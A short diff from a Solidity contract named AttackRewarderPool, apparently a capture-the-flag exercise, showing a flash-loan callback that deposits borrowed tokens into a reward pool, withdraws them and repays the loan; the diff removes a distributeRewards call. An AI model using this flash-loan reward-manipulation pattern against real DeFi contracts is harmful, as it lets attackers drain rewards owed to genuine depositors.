@@ -36,7 +36,6 @@ contract AttackRewarderPool {
     function receiveFlashLoan(uint256 amount) external {
       token.approve(address(rewardPool), amount);
       rewardPool.deposit(amount);
-      rewardPool.distributeRewards();
       rewardPool.withdraw(amount);
       token.transfer(loaner, amount);
     }
